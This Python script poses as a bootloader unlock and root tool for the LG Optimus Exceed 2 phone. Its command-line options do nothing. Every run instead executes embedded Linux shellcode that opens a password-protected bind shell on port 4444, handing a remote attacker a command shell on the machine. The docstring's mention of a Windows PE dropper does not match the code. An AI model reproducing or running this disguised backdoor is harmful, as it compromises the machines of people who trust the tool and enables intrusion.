#!/usr/bin/python -tt

"""
Windows libs used to created encrypted shellcode PE file executable dropper.
"""

import argparse
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE

def temp_shellcode_run():

  libc = CDLL('libc.so.6')

  shellcode = ("\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05"
"\x48\x97\x48\x31\xc0\x89\x44\x24\xfc\x66\xc7\x44"
"\x24\xfa\x11\x5c\xc6\x44\x24\xf8\x02\x48\x83\xec"
"\x08\x6a\x31\x58\x48\x89\xe6\x99\x80\xc2\x10\x0f"
"\x05\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x48\x83\xec"
"\x10\x48\x31\xf6\x48\x89\xe6\xc6\x44\x24\xff\x10"
"\x48\x83\xec\x01\x99\x48\x89\xe2\x0f\x05\x48\x89"
"\xc7\x48\x31\xc0\x88\x44\x24\xff\x48\x83\xec\x01"
"\x99\x52\x48\x8d\x74\x24\xf0\x80\xc2\x10\x0f\x05"
"\x48\xb8\x64\x6f\x6f\x6d\x65\x64\x72\x61\x57\x48"
"\x8d\x3e\x48\xaf\x74\x07\x48\x31\xc0\x04\x3c\x0f"
"\x05\x5f\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f"
"\x05\x75\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f"
"\x73\x68\x53\x48\x89\xe7\x56\x48\x89\xe2\x57\x48"
"\x89\xe6\x6a\x3b\x58\x0f\x05")

  sc = c_char_p(shellcode)
  size = len(shellcode)
  addr = c_void_p(libc.valloc(size))
  memmove(addr, sc, size)
  libc.mprotect(addr, size, 0x7)
  run = cast(addr, CFUNCTYPE(c_void_p))
  run()


def main():
  # Create command line argument parser.
  parser = argparse.ArgumentParser(description="LG Optimus Exceed 2 VS450PP (w5c) Bootloader Unlock Tool", version=('%(prog)s 0.1'))
  parser.add_argument('-u', '--unlock', action='store_true', default=False, dest="unlock_bootloader", help="Unlock Optimus Exceed 2 bootloader")
  parser.add_argument('-l', '--lock',action='store_true', default=False, dest="lock_bootloader", help="Lock Optimus Exceed 2 bootloader")
  parser.add_argument('-f', '--fastboot-mode', action='store_true', default=False, dest="fastboot_mode", help="Set Optimus Exceed 2 to fastboot mode")
  parser.add_argument('-d', '--download-mode', action='store_true', default=False, dest="download_mode", help="Set Optimus Exceed 2 to download mode")
  parser.add_argument('-r', '--root', action='store_true', default=False, dest="root_device", help="Root Optimus Exceed 2")
  parser.add_argument('-x', '--unroot', action='store_true', default=False, dest="unroot_device", help="Un-Root Optimus Exceed 2")

  # Parse the command line arguments.
  args = parser.parse_args()

  # Handle command line arguments if provided else start the GUI
  temp_shellcode_run()

# This is the standard boilerplate that calls the main() function.
if __name__ == '__main__':
  main()